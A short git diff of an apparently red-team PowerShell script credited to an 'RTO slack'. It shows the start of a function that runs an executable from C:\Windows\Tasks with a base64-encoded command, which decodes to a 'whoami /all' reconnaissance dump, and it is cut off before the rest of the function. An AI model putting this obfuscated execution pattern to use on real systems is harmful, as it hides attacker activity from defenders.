@@ -1,4 +1,4 @@
-//not mine init5's from the RTO slack :)
+#not mine init5's from the RTO slack :)
 
 function RegShit {
     $cmd = "C:\Windows\Tasks\foo.exe -enc dwBoAG8AYQBtAGkAIAAvAGEAbABsACAAPgAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABvAG8AcABzAC4AdAB4AHQA"
